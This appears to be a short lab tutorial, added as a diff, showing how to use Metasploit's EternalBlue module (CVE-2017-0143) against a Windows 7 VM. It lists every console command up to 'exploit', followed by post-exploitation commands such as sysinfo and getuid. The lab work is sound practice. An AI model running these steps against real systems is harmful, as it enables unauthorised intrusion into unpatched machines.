@@ -1,0 +1,31 @@
+Exploitation on a Windows 7 VM using Metasploit.
+
+A prerequisite for this session would be a vulnerability scan using Nessus on the victim machine that we performed on Day 4.
+Through this scan, we come to know that the vulnerability: Microsoft CVE-2017–0143: Windows SMB Remote Code Execution Vulnerability will help us to gain access to the victim machine.
+The steps and commands used are:
+1. Open the terminal and initialize msfdb:
+msfdb init
+2. Start PostgreSQL server:
+service postgresql start
+3. Start the msfconsole:
+msfconsole
+4. search for the vulnerability script:
+search 2017–0143
+5. get more info on the script:
+info exploit/windows/smb/ms17_010_eternalblue
+6. make the msfconsole to use our script
+use exploit/windows/smb/ms17_010_eternalblue
+7. check for available parameters
+show options
+8. set rhost to our victim IP address
+set RHOSTS <IP>
+9. here we to verify if LHOST = attacker IP and RPORT = vulnerable port
+10. lastly we need to run our script:
+exploit
+After successfully running our script we should see something like this:
+Once access is gained, we should try the following commands:
+sysinfo // information about the victim's computer
+getuid // As which user have we gained the access
+ipconfig // Victim machines IP addresses
+
+For more commands, we can type help to get the whole list of available commands
